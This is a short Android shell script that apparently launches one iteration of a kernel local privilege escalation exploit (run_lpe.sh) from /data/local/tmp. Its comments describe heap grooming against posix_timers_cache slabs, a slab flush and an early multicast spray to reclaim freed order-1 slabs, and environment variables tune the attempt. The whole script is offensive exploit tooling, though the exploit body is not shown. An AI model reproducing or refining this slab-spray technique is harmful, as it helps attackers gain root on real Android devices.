#!/system/bin/sh
# run11: runtime pad alignment + early spray.  IC_PAD_ALIGN makes the 4200-pad
# block start exactly on a posix_timers_cache slab boundary, so the last 15
# pads really are the only non-flusher objects in X's slab; IC_SPRAY_EARLY
# starts the mcast spray immediately after the flush delete, so it is already
# asking for fresh order-1 slabs when the discard lands (~30 ms later) instead
# of ~0.7 s afterwards.  The 496 MB skb queue is skipped in early mode.
cd /data/local/tmp || exit 1
rm -f ic-run11.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run11.log 2>&1 &
exit 0
